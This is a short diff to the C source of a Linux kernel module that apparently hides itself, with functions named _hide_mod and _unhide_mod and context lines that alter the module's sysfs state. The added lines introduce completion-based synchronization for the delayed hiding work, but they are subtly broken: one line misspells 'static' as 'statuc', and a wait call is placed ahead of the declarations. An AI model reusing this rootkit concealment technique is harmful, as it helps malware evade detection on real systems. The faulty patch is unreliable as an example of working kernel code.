@@ -205,6 +205,7 @@ static void hide_work_fn(struct work_struct *work)
 }
 
 static DECLARE_DELAYED_WORK(hide_work, hide_work_fn);
+statuc DECLARE_COMPLETION(hide_work_done);
 
 static int _hide_mod(void)
 {
@@ -257,6 +258,7 @@ static int _hide_mod(void)
 	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 
 	// Some hiding steps need to be done after do_init_module
+	reinit_completion(&hide_work_done);
 	schedule_delayed_work(&hide_work, msecs_to_jiffies(2000));
 
 	return 0;
@@ -268,6 +270,7 @@ static int _hide_mod(void)
 // command to unload the module safely.
 static int _unhide_mod(void)
 {
+	wait_for_completion(&hide_work_done);
 	int err;
 	struct kobject *kobj;
 
